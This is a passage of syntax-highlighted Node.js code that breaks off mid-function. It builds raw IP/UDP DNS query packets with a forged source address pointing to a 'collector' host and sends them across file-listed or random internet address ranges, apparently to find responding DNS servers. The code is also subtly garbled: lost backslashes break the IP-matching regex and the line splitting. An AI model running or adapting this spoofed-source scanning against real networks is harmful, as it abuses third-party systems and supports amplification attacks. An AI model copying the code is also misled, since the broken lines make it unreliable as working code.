<span style="color: #000066; font-weight: bold;">var</span> buffer <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> Buffer <span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- IP packet ----------</span><br/>
&nbsp;0x45<span style="color: #339933;">,</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x25<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//length</span><br/>
&nbsp;0x7c<span style="color: #339933;">,</span> 0x9b<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//ID</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//flagsfragment offset</span><br/>
&nbsp;0x80<span style="color: #339933;">,</span> &nbsp;<span style="color: black; font-style: italic;">//TTL</span><br/>
&nbsp;0x11<span style="color: #339933;">,</span> &nbsp;<span style="color: black; font-style: italic;">//protocol</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//crc</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//source IP</span><br/>
&nbsp;0xc0<span style="color: #339933;">,</span> 0xa8<span style="color: #339933;">,</span> 0x41<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//dest IP</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- 8 bytes &nbsp;of UDP packet ----------</span><br/>
&nbsp;0x14<span style="color: #339933;">,</span> 0xE9<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//sender port</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x35<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//target port</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x19<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//data length</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//crc</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- 17 bytes of DNS packet ----------</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>0x01<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01<br/>
<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip2long <span style="color: black;">&#40;</span> ip_address <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> output <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">false</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> parts <span style="color: #339933;">=</span> <span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>ip_address.<span style="color: #660066;">match</span><span style="color: black;">&#40;</span><span style="color: #009966; font-style: italic;">/^d{1,3}.d{1,3}.d{1,3}.d{1,3}$/</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; parts &nbsp;<span style="color: #339933;">=</span> ip_address.<span style="color: #660066;">split</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'.'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; output <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> parts<span style="color: black;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">16777216</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> parts<span style="color: black;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">65536</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> parts<span style="color: black;">&#91;</span><span style="color: #CC0000;">2</span><span style="color: black;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">256</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> parts<span style="color: black;">&#91;</span><span style="color: #CC0000;">3</span><span style="color: black;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">1</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">return</span> output<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> long2ip <span style="color: black;">&#40;</span> proper_address <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> output <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">false</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">!</span>isNaN <span style="color: black;">&#40;</span> proper_address <span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span> proper_address <span style="color: #339933;">&gt;=</span> <span style="color: #CC0000;">0</span> <span style="color: #339933;">||</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; proper_address <span style="color: #339933;">&lt;=</span> <span style="color: #CC0000;">4294967295</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; output <span style="color: #339933;">=</span> <span style="">Math</span>.<span style="color: #660066;">floor</span> <span style="color: black;">&#40;</span>proper_address <span style="color: #339933;">/</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">floor</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> proper_address <span style="color: #339933;">%</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">/</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">floor</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> proper_address <span style="color: #339933;">%</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> &nbsp;<span style="color: #339933;">%</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">floor</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> proper_address <span style="color: #339933;">%</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">%</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">/</span><br/>
&nbsp; &nbsp;<span style="">Math</span>.<span style="color: #660066;">pow</span> <span style="color: black;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">return</span> output<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> rand<span style="color: black;">&#40;</span>max<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> <span style="">Math</span>.<span style="color: #660066;">floor</span><span style="color: black;">&#40;</span><span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span>max<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_length<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_id<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_ttl<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt8</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">8</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt8</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">8</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_proto<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt8</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">9</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt8</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">9</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_crc<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_source_addr<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt32BE</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">12</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt32BE</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">12</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> ip_packet_dest_addr<span style="color: black;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>newval<span style="color: black;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; buff.<span style="color: #660066;">writeUInt32BE</span><span style="color: black;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">16</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt32BE</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">16</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: black; font-style: italic;">//process IP ranges</span><br/>
<span style="color: #000066; font-weight: bold;">function</span> parseIpFile<span style="color: black;">&#40;</span>filename<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">var</span> diapasons <span style="color: #339933;">=</span> <span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">var</span> ip_database <span style="color: #339933;">=</span> fs.<span style="color: #660066;">readFileSync</span><span style="color: black;">&#40;</span>filename<span style="color: black;">&#41;</span>.<span style="color: #660066;">toString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">split</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'n'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;ranges readed : %d&quot;</span><span style="color: #339933;">,</span> ip_database.<span style="color: #660066;">length</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">var</span> totalAddreses <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ip_database.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i <span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp; <span style="color: #000066; font-weight: bold;">var</span> rangeStartEnd <span style="color: #339933;">=</span> ip_database<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #660066;">split</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'-'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">var</span> startIp <span style="color: #339933;">=</span> ip2long<span style="color: black;">&#40;</span>rangeStartEnd<span style="color: black;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">var</span> endIp <span style="color: #339933;">=</span> ip2long<span style="color: black;">&#40;</span>rangeStartEnd<span style="color: black;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; totalAddreses <span style="color: #339933;">+=</span> <span style="color: black;">&#40;</span>endIp <span style="color: #339933;">-</span> startIp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; diapasons.<span style="color: #660066;">push</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><br/>
&nbsp; &nbsp;startIp<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp;endIp<br/>
&nbsp; <span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp;console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'total addreses : %d'</span><span style="color: #339933;">,</span> totalAddreses<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> diapasons<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> sendPacket<span style="color: black;">&#40;</span>possibleNSip<span style="color: #339933;">,</span> callback<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
<br/>
&nbsp;ip_packet_dest_addr<span style="color: black;">&#40;</span>buffer<span style="color: #339933;">,</span> possibleNSip<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;ip_packet_source_addr<span style="color: black;">&#40;</span>buffer<span style="color: #339933;">,</span> collectorIpLong<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<br/>
&nbsp;socket.<span style="color: #660066;">send</span> <span style="color: black;">&#40;</span>buffer<span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">,</span> buffer.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> long2ip<span style="color: black;">&#40;</span>possibleNSip<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">function</span> <span style="color: black;">&#40;</span>error<span style="color: #339933;">,</span> bytes<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp;callback<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> randomIp<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> ip2long<span style="color: black;">&#40;</span><span style="color: black;">&#91;</span>rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br/>
&nbsp;rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: black;">&#41;</span><span style="color: black;">&#93;</span>.<span style="color: #660066;">join</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'.'</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> nextIp <span style="color: #339933;">,</span> endIp<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">var</span> current_ip <span style="color: #339933;">=</span> nextIp<span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>diapasons<span style="color: black;">&#41;</span> <span style="color: #339933;">===</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; current_ip <span style="color: #339933;">=</span> randomIp<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: black;">&#40;</span>current_ip<span style="color: black;">&#41;</span> <span style="color: #339933;">===</span> <span style="color: #3366CC;">'undefined'</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">var</span> current_iprange <span style="color: #339933;">=</span> diapasons.<span style="color: #660066;">shift</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span> current_iprange.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;current_ip <span style="color: #339933;">=</span> current_iprange<span style="color: black;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp;endIp <span style="color: #339933;">=</span> current_iprange<span style="color: black;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">else</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp;sendPacket<span style="color: black;">&#40;</span>current_ip<span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>current_ip <span style="color: #339933;">===</span> endIp<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'end of range, try next'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp;repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">else</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;process.<span style="color: #660066;">nextTick</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
